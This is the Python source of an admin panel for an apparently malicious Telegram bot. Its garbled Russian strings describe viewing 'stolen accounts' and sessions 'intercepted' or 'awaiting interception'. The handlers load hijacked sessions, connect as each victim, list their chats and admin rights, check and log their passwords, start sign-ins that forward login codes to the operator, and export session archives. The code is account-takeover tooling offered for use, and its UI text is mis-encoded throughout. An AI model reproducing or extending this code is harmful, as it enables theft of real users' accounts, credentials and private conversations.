import logging
import phonenumbers
from phonenumbers.phonenumberutil import region_code_for_country_code
from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import ImportSession
from tgbot.states.State import State
from tgbot.services.Log import Log

# Configure logging for error tracking and debugging
logger = logging.getLogger(__name__)

async def menu(message, state, repo, edit):
    """Display the main admin panel with available options."""
    title = "‚öôÔ∏è –ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∞"
    text = [
        "–ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –æ—Ç—Å–ª–µ–¥–∏—Ç—å –≤—Å—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞, –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —É–∫—Ä–∞–¥–µ–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã –∏ –º–Ω–æ–≥–æ –¥—Ä—É–≥–æ–µ.\n",
        "<b>üë§ –ê–∫–∫–∞—É–Ω—Ç—ã</> - –≤—ã–≤–µ—Å—Ç–∏ –≤–µ—Å—å —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤",
        "<b>üîç –ß–µ–∫–Ω—É—Ç—å</> - —á–µ–∫–Ω—É—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π –∞–∫–∫, –ø–æ–∏—Å–∫ –ø–æ ID –∏–ª–∏ –Ω–æ–º–µ—Ä—É",
        "<b>üìà –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</> - –æ–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞",
        "<b>üì§ –≠–∫—Å–ø–æ—Ä—Ç</> - –ø–æ–ª—É—á–∏—Ç—å –∞—Ä—Ö–∏–≤ —Å–µ—Å—Å–∏–π"
    ]
    await state.update_data(page=1)
    markup = await keyboard.admin.main()
    await dialog(message, edit=edit, text=text, markup=markup, title=title)

async def accs(message, state, repo, edit):
    """List all available accounts with their session status."""
    title = "üë§ –ê–∫–∫–∞—É–Ω—Ç—ã"
    accs = await repo.list_users_of_sessions()
    text = [
        "–ó–¥–µ—Å—å –≤—ã–≤–µ–¥–µ–Ω —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤.",
        f"üëâ –î–æ—Å—Ç—É–ø–Ω–æ: <b>{len(accs)}</>\n",
        "‚úÖ - —É—Å–ø–µ—à–Ω—ã–π –≤—ã—Ö–æ–¥ –∏–∑ –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π",
        "‚ùóÔ∏è - –æ–∂–∏–¥–∞–µ—Ç –≤—ã—Ö–æ–¥–∞ –∏–∑ –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π"
    ]
    markup = await keyboard.admin.accs(accs, state)
    await dialog(message, edit=True, text=text, markup=markup, title=title)

async def get_user_info(client, repo, config):
    """
    Gather and format user information from the client.

    Args:
        client: The Telegram session client.
        repo: Repository for accessing user data.
        config: Bot configuration for dialog checks.

    Returns:
        tuple: (title, text) if successful, (None, None) if failed.
    """
    try:
        user = await client.check_dialogs(config)
    except Exception as e:
        logger.error(f"Error checking dialogs: {e}")
        return None, None

    if not user:
        return None, None

    try:
        phone = client.meta['phone']
        region = phonenumbers.parse('+' + str(phone.replace('+', '')))
        country = region_code_for_country_code(region.country_code)
    except phonenumbers.NumberParseException:
        logger.warning(f"Failed to parse phone number: {phone}")
        country = "Unknown"

    ses = (await repo.get_user(user['user'].id))['reset_auth']
    ses_status = "–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–∞ ‚úÖ" if ses else "–û–∂–∏–¥–∞–µ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ ‚ùóÔ∏è"
    title = f"üë§ –ê–∫–∫–∞—É–Ω—Ç {client.meta['user_id']}"
    text = [
        f"üìå –°–µ—Å—Å–∏—è: <b>{ses_status}</>\n",
        f"üë§ ID: <code>{user['user'].id}</>",
        f"üîπ Username: <b>{user['user'].username}</>",
        f"üì≤ –ù–æ–º–µ—Ä: <b>{phone}</>",
        f"üí° –°—Ç—Ä–∞–Ω–∞: <b>{country}</>",
        f"‚≠êÔ∏è –ü—Ä–µ–º–∏—É–º: <b>{user['user'].is_premium}</>",
        f"‚ùóÔ∏è –°–∫–∞–º: <b>{user['user'].is_scam}</>"
    ]
    text.append("\nüëá <b> –î–∏–∞–ª–æ–≥–∏ üëá</>\n")
    dialog_types = {
        'channel': 'üîî –ö–∞–Ω–∞–ª—ã',
        'bot': 'ü§ñ –ë–æ—Ç—ã',
        'private': 'üí¨ –õ–∏—á–Ω—ã–µ',
        'group': 'üë§ –ì—Ä—É–ø–ø—ã',
        'supergroup': 'üë• –°—É–ø–µ—Ä–≥—Ä—É–ø–ø—ã'
    }
    for key, label in dialog_types.items():
        if key in user:
            text.append(f"{label}: <b>{user[key]}</b>")
    text.append(f"\nüëâ –°–æ–æ–±—â–µ–Ω–∏—è –≤ –∏–∑–±—Ä–∞–Ω–Ω–æ–º: <b>{user['me']}</>")
    text.append(f"üëâ –ê–¥–º–∏–Ω-–ø—Ä–∞–≤–∞: <b>{user['is_creator']}</> (–∏–∑–±—Ä–∞–Ω–Ω–æ–µ —É—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è)\n")
    if user.get('find', '') != '':
        text.append(f"üîç <b>–ù–∞–π–¥–µ–Ω–Ω—ã–µ –¥–∏–∞–ª–æ–≥–∏:</b> {user['find']}")
    return title, text

async def open_acc(message, state, repo, edit):
    """Show detailed information for a selected account."""
    select_user = (await state.get_data())['_select']
    await repo.del_sign_in(select_user)
    client = ImportSession().inject(select_user)

    try:
        await client.client.connect()
    except Exception as e:
        logger.error(f"Failed to connect to client for {select_user}: {e}")
        title = "‚ùóÔ∏è–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"
        text = ["–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –∫–ª–∏–µ–Ω—Ç—É."]
        markup = await keyboard.admin.back_to_open_acc()
        await dialog(message, edit=True, text=text, markup=markup, title=title)
        return

    title, text = await get_user_info(client, repo, message.bot.config)
    if not title:
        title = "‚ùóÔ∏è–ü—Ä–æ–∏–∑–æ—à–ª–∞ –∫–∞–∫–∞—è-—Ç–æ –æ—à–∏–±–∫–∞"
        text = [
            "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞—â–µ–Ω–∏–∏ –∫ –¥–∞–Ω–Ω–æ–º—É –∞–∫–∫–∞—É–Ω—Ç—É, –≤–æ–∑–º–æ–∂–Ω–æ —Å–µ—Å—Å–∏—è –Ω–µ–≤–∞–ª–∏–¥–Ω–∞ –∏–ª–∏ –∞–∫–∫–∞—É–Ω—Ç –±—ã–ª –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.\n",
            "<b>–•–æ—Ç–∏—Ç–µ –ª–∏ –í—ã —É–¥–∞–ª–∏—Ç—å –≤—Å–µ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ–± —ç—Ç–æ–º –∞–∫–∫–∞—É–Ω—Ç–µ?</>"
        ]
        markup = await keyboard.admin.delete_acc(select_user)
    else:
        markup = await keyboard.admin.select(select_user)

    await client.client.disconnect()
    await dialog(message, edit=True, text=text, markup=markup, title=title)

async def delete_acc(message, state, repo, edit):
    """Delete a selected account and return to the account list."""
    select_user = (await state.get_data())['_select']
    await repo.delete_user_of_phone(select_user)
    await State.admin.accs.set()
    await migrate(message=message, state=state, repo=repo, edit=True)

async def acc_check_pass(message, state, repo, edit):
    """Check passwords for a selected account and log them."""
    await message.delete()
    select_user = (await state.get_data())['_select']
    client = ImportSession().inject(select_user)
    try:
        await client.client.connect()
        passwords = await client.check_passwords()
        await Log(message).passwords(passwords)
    except Exception as e:
        logger.error(f"Error checking passwords for {select_user}: {e}")
    finally:
        await client.client.disconnect()
    await State.admin.open_acc.set()
    await migrate(message=message, state=state, repo=repo, edit=False)

async def acc_sign_in(message, state, repo, edit):
    """Handle sign-in process for a selected account."""
    await message.delete()
    select_user = (await state.get_data())['_select']
    client = ImportSession().inject(select_user)
    try:
        await client.client.connect()
        count = await client.get_support()
        await repo.sign_in(select_user, count)
    except Exception as e:
        logger.error(f"Sign-in failed for {select_user}: {e}")
        title = "‚ùóÔ∏è–û—à–∏–±–∫–∞"
        text = ["–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—Ö–æ–¥–µ –≤ –∞–∫–∫–∞—É–Ω—Ç."]
        markup = await keyboard.admin.back_to_open_acc()
        await dialog(message, edit=True, text=text, markup=markup, title=title)
        return
    finally:
        await client.client.disconnect()
    title = "üì≤ –í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç"
    text = [
        f"–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä <code>{select_user}</> –∏ –∂–¥–∏—Ç–µ –∫–æ–¥ –¥–ª—è –≤—Ö–æ–¥–∞ –≤ –∞–∫–∫–∞—É–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–¥–µ—Ç –≤ —ç—Ç–æ—Ç —á–∞—Ç."
    ]
    markup = await keyboard.admin.back_to_open_acc()
    await dialog(message, edit=True, text=text, markup=markup, title=title)

async def dialog_admin(state, message, current_state, repo, edit: bool = True):
    """Route admin commands based on the current state."""
    state_handlers = {
        State.admin.main.state: menu,
        State.admin.accs.state: accs,
        State.admin.open_acc.state: open_acc,
        State.admin.delete_acc.state: delete_acc,
        State.admin.acc_check_pass.state: acc_check_pass,
        State.admin.acc_sign_in.state: acc_sign_in
    }
    handler = state_handlers.get(current_state)
    if handler:
        await handler(message, state, repo, edit)
    else:
        logger.warning(f"Unhandled state: {current_state}")